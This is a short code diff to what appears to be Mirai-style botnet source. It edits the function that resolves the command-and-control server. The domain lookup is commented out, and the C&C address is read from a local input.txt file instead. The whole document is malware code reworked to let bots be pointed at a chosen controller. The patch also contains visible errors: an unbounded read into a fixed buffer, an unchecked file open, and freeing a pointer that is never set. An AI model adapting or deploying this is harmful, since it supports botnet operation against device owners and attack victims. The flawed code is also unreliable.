@@ -357,19 +357,27 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
+      FILE *fp;
+      char buff[255];
+      fp = fopen("input.txt", "r");
+      fscanf(fp, "%s", buff);
+      printf("[acquiring cnc address from input.txt] %s\n", buff);
+      fclose(fp);
+
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
-    table_lock_val(TABLE_CNC_DOMAIN);
-    if (entries == NULL)
-    {
-#ifdef DEBUG
-        printf("[main] Failed to resolve CNC address\n");
-#endif
-        return;
-    }
-    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+// entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+//    table_lock_val(TABLE_CNC_DOMAIN);
+//    if (entries == NULL)
+//    {
+// #ifdef DEBUG
+//         printf("[main] Failed to resolve CNC address\n");
+// #endif
+//        return;
+//    }
+//
+    srv_addr.sin_addr.s_addr = inet_addr(buff);
     resolv_entries_free(entries);
 
     table_unlock_val(TABLE_CNC_PORT);
